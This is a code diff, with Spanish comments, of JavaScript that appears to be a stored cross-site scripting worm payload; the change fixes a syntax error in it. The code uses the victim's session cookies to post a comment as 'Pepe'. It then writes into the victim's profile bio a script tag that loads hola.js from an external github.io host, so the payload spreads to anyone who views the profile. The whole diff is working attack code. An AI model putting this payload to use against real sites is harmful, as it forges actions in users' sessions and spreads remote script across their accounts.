@@ -41,23 +41,23 @@
       .trim().toLowerCase();
 
 
-      const params = new URLSearchParams();
+      const params3 = new URLSearchParams();
       // Ajustá estos nombres de campo según el formulario real
-      params.append('txtComentario', 'Hola, soy Pepe y dejo mi comentario.');
-      params.append('post_id', '1');
-      params.append('btnEnviar', 'Enviar');
+      params3.append('txtComentario', 'Hola, soy Pepe y dejo mi comentario.');
+      params3.append('post_id', '1');
+      params3.append('btnEnviar', 'Enviar');
 
       fetch('/comentarios.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         credentials: 'include',
-        body: params.toString()
+        body: params3.toString()
       }).then(r => {
         if (r.ok) localStorage.setItem('pepeComentado', '1');
       });
 
       const params2 = new URLSearchParams();
-      const params2.append("bio","<script src=\"https://ianrichard3.github.io/thea/hola.js\"></script>")
+      params2.append("bio","<script src=\"https://ianrichard3.github.io/thea/hola.js\"></script>")
       fetch('/profile.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
